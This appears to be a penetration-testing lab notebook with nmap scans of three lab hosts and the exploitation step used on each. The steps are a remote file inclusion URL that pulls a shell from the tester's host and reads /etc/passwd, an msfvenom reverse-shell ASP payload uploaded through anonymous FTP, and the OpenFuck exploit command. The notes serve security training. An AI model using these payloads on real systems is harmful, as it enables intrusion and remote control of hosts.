### 10.11.1.8

#### information

Not shown: 990 filtered ports
PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         vsftpd 2.0.1
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: ERROR
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.11.0.104
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 2.0.1 - secure, fast, stable
|_End of status
22/tcp   open   ssh         OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey:
|   1024 89:94:af:2e:5d:c1:da:84:25:11:2c:12:45:c6:70:ac (RSA1)
|   1024 c1:c5:d1:83:0f:4d:d8:9e:8f:82:4c:be:53:4b:6e:14 (DSA)
|_  1024 bc:e1:e6:dd:ab:5e:fd:d1:21:2e:11:7c:d5:b2:03:52 (RSA)
|_sshv1: Server supports SSHv1
25/tcp   closed smtp
80/tcp   open   http        Apache httpd 2.0.52 ((CentOS))
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 2 disallowed entries
|_/internal/  /tmp/
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open   rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            844/udp  status
|_  100024  1            847/tcp  status
139/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)
443/tcp  open   ssl/https?
|_ssl-date: 2019-03-01T08:39:29+00:00; -11s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
445/tcp  open   netbios-ssn Samba smbd 3.0.33-0.17.el4 (workgroup: MYGROUP)
631/tcp  open   ipp         CUPS 1.1
| http-methods:
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
3306/tcp open   mysql?
|_mysql-info: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:50:56:89:24:79 (VMware)
Service Info: OS: Unix

Host script results:
|_clock-skew: mean: 1h39m49s, deviation: 2h53m12s, median: -11s
| smb-os-discovery:
|   OS: Unix (Samba 3.0.33-0.17.el4)
|   Computer name: phoenix
|   NetBIOS computer name:
|   Domain name:
|   FQDN: phoenix
|_  System time: 2019-03-01T03:39:28-05:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

###  exploit

https://www.exploit-db.com/exploits/9623

#### poc

http://10.11.1.8/internal/advanced_comment_system/index.php?ACS_path=http://10.11.0.104/shell.txt%00&cmd=cat /etc/passwd

```shell
<pre>root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nolo
```







### 10.11.1.13

####  information

#### exploit

ftp allow anonymous user to upload file in wwwroot path

ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection for /bin/ls.
01-17-07  06:42PM       <DIR>          AdminScripts
01-17-07  06:43PM       <DIR>          ftproot
01-17-07  06:43PM       <DIR>          iissamples
01-17-07  06:43PM       <DIR>          Scripts
03-13-19  11:46AM       <DIR>          wwwroot

#### poc

msfveon -p windows/meterpreter/reverse_tcp  lhost=ip lport=port  -f asp -o sh.asp

### 10.11.1.22

Nmap scan report for 10.11.1.22
Host is up (0.29s latency).
Not shown: 989 closed ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp?
22/tcp    open  ssh         OpenSSH 3.1p1 (protocol 1.99)
| ssh-hostkey:
|   1024 4a:e3:f8:07:d5:d6:b1:b5:bf:54:ac:e7:17:36:7e:e8 (RSA1)
|   1024 77:67:f2:2c:3d:7c:45:24:fe:5e:0f:de:07:65:b3:57 (DSA)
|_  1024 42:b1:48:0b:41:f8:a9:12:cc:9b:c4:ed:26:74:64:2c (RSA)
|_sshv1: Server supports SSHv1
23/tcp    open  telnet?
25/tcp    open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http        Apache httpd 1.3.23 ((Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2)
| http-methods:
|_  Potentially risky methods: PUT DELETE CONNECT PATCH PROPFIND PROPPATCH MKCOL COPY MOVE LOCK UNLOCK TRACE
|_http-server-header: Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1          32768/tcp  status
|_  100024  1          32768/udp  status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
199/tcp   open  smux        Linux SNMP multiplexer
443/tcp   open  ssl/https   Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.
|_http-server-header: Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2
|_http-title: 400 Bad Request
|_ssl-date: 2019-03-13T13:30:48+00:00; -2s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
995/tcp   open  ssl/pop3s?
|_ssl-date: 2019-03-13T13:30:47+00:00; -3s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
32768/tcp open  status      1 (RPC #100024)
MAC Address: 00:50:56:89:2E:AA (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

#### exploit

https://medium.com/@javarmutt/how-to-compile-openfuckv2-c-69e457b4a1d1

poc

https://www.exploit-db.com/raw/764

./openfuck 0x73 10.11.1.22 -c 40

